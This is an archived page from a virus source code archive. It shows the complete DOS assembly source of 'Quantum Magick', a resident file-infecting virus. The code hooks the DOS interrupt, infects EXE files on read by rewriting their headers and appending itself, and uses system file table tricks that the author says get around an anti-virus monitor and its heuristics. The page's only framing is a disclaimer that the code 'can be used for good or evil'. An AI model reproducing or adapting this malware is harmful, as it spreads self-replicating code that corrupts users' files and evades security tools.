<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: qmagick_asm</title>
<meta name="KEYWORDS" content="qmagick.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for qmagick.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="qmagick_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/qmagick_asm.php">qmagick_asm</a><br>
<a href="qmu_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/qmu_asm.php">qmu_asm</a><br>
<a href="qp3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/qp3_asm.php">qp3_asm</a><br>
<a href="quit1992_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/quit1992_asm.php">quit1992_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>


; Quantum Magick, a laboratory specimen by Rhincewind [Vlad]
;
; This is a bit of my older work. Quantum Magick demonstrates the use of
; SFT's to infect programs on file read, which happens to circumvent
; tbfile if it was the command interpreter that originally opened the file.
;
; Some of the code in here has high embarrassment potential, such as the 
; kludgey fragment used to avoid the Darth Vader scanstring and heuristics,
; not to mention the use of the jumps directive. Ouch.
;
; The more-than-necessary use of memory pushes and pops and exchanges 
; involving the memory banks are just because I felt like it. 
;
; And that's that.

                .model tiny
                .code
                jumps
                org 0h

start:
                push ds
                push es
installation_check:
                mov ah, 30h
                int 21h
                cmp bh,30h
                jz no_install
                cmp al,3
                jb no_install
allocate_memory:
                push es
                pop ax
                dec ax
                push ax
                pop ds
                xor si,si
                lodsb
                xor al, 'Z'
                jnz abort_install
                add word ptr ds:[si+2], -parasize
                add word ptr ds:[si+11h], -parasize
copy_code:
                mov es, word ptr ds:[si+11h]
                push cs
                call next
next:
                pop si
                pop ds
                sub si, offset (next-start)
                mov cx, (endvirus-start)
                xor di,di
                rep movsb
hook_int:                
                push cx
                pop ds
                cli
                mov ax, offset handler
                xchg ax, word ptr ds:[84h]
                stosw
                mov ax,es
                xchg ax, word ptr ds:[86h]
                stosw
                sti
abort_install:
no_install:
                pop es
                pop ds
                mov bx,ds
                add bx,10h
                call next2
next2:
                pop si
                add bx, word ptr cs:[si+(_cs-next2)]
                push bx
                push word ptr cs:[si+(_ip-next2)]
                xor ax,ax
                xor bx,bx
                xor cx,cx
                xor dx,dx
                xor si,si
                xor di,di
                retf
handler:
                cmp ah, 3fh
                jz viruzz
                cmp ah, 30h
                jnz no_chk
                push ax
                call call_int21
                pop bx
                retf 2

plate           db 'Quantum Magick'

no_chk:
                jmp dword ptr cs:int21offset
viruzz:
                cmp bl,5
                jb no_chk
                call call_int21
                pushf
                cmp ax, 18h
                jb not_enough_bytes_read
                push si
                push ax
                push cx
                push dx
                push di
                push ds
                push bx
                push ax
get_sft_address:
                mov si, 1220h
                xchg si,ax
                int 2fh
                mov si, 1216h
                mov bl, byte ptr es:[di]
                xchg si,ax
                int 2fh
                xor si,si
                pop ax
                mov bx,dx
                xchg ax,cx
                call getlen
                sub ax, cx
                jnz no_start_read
                sbb dx, ax
                jnz no_start_read
start_read:
                mov ax, 'ZM'
                xor ax, word ptr ds:[bx]
                jnz exit_read
                cmp word ptr ds:[bx+18h], 40h
                jz exit_read
                cmp word ptr ds:[bx+1ah],si
                jnz exit_read
                cmp word ptr ds:[bx+0ch],si
                jz exit_read
                call getlen
                mov cx, 10h                     ;Filesize div 16.
                div cx
                sub ax, word ptr ds:[bx+8]
                xchg word ptr ds:[bx+14h], dx    ;=CS:IP pair..
                xchg word ptr ds:[bx+16h], ax
                mov cs:_cs,ax
                mov cs:_ip,dx
                mov cl,5
                shr ax,cl
                neg ax
                add ax, word ptr ds:[bx+4]
                cmp al,5
                jb exit_read
                call getlen
                add ax, (endvirus-start)
                adc dx, si
                mov cx, 200h
                div cx
                or dx,dx
                jz no_hiccup
                inc ax
no_hiccup:
                mov word ptr ds:[bx+4],ax
                mov word ptr ds:[bx+2],dx
endcalc:
                mov dx,bx
                pop bx
                push word ptr es:[di+2]
                push word ptr es:[di+15h]
                push word ptr es:[di+17h]
                mov byte ptr es:[di+2],2
                mov word ptr es:[di+15h], 2
                mov word ptr es:[di+17h], si
                mov ah, 40h
                mov cx, 18h
                inc dx
                inc dx
                int 21h
                call getlen
                mov word ptr es:[di+15h], ax
                mov word ptr es:[di+17h], dx
                mov ah, 40h
                push cs
                pop ds
                mov cx, (endvirus-start)
                xor dx,dx
                int 21h
                pop word ptr es:[di+17h]
                pop word ptr es:[di+15h]
                pop word ptr es:[di+2]
                jmp after_file_access
no_start_read:
exit_read:
                pop bx
after_file_access:
                pop ds
                pop di
                pop dx
                pop cx
                pop ax
                pop si
not_enough_bytes_read:                
                popf
                retf 2
getlen:
                mov ax, word ptr es:[di+11h]
                mov dx, word ptr es:[di+13h]
                ret
_cs             dw 0fff0h
_ip             dw 0
call_int21:
                pushf
                call dword ptr cs:int21offset
                ret
endvirus:
int21offset     dw ?
int21seg        dw ?
parasize        equ ((endvirus-start)/16)+2
                
                end start



</textarea></td></tr></table></body></html>
